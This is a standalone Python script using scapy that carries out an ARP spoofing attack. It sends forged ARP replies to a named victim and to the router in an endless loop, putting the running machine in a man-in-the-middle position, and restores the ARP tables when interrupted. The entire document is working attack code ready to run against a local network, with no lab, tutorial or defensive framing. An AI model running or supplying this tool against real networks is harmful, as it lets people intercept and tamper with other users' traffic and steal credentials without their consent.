#!/usr/bin/env python3
import scapy.all as scapy
import sys
import time

def get_mac(ip):
    """Return the MAC address for a given IP using ARP request."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    """Send a spoofed ARP reply to target_ip, claiming to be spoof_ip."""
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    """Send the real MAC address to restore the ARP table."""
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                           psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

if len(sys.argv) != 3:
    print(f"Usage: sudo python3 {sys.argv[0]} <Victim_IP> <Router_IP>")
    sys.exit(1)

victim_ip = sys.argv[1]
router_ip = sys.argv[2]

try:
    sent_packets_count = 0
    while True:
        spoof(victim_ip, router_ip)  # Tell victim: I am the router
        spoof(router_ip, victim_ip)  # Tell router: I am the victim
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C — restoring ARP tables...")
    restore(victim_ip, router_ip)
    restore(router_ip, victim_ip)
    print("[+] ARP tables restored. Exiting.")
